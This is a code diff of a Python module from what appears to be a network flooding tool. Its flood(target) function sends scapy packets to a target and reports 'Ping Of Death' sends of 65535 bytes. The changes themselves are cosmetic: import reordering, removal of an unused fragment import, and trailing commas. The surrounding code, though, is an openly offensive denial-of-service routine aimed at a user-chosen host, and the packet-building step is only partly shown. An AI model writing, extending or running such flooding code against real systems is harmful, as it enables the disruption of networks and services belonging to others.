@@ -1,7 +1,8 @@
 # Import modules
 import random
-from scapy.all import IP, ICMP, send, fragment
+
 from colorama import Fore
+from scapy.all import ICMP, IP, send
 
 __letters = list("1234567890qwertyuiopasdfghjklzxcvbnm")
 
@@ -15,9 +16,9 @@ def flood(target):
             send(packet, verbose=False)
         except Exception as e:
             print(
-                f"{Fore.RED}[!] {Fore.MAGENTA}Error while sending 'Ping Of Death'\n{Fore.MAGENTA}{e}{Fore.RESET}"
+                f"{Fore.RED}[!] {Fore.MAGENTA}Error while sending 'Ping Of Death'\n{Fore.MAGENTA}{e}{Fore.RESET}",
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}65535 bytes send to {target[0]} {Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}65535 bytes send to {target[0]} {Fore.RESET}",
             )
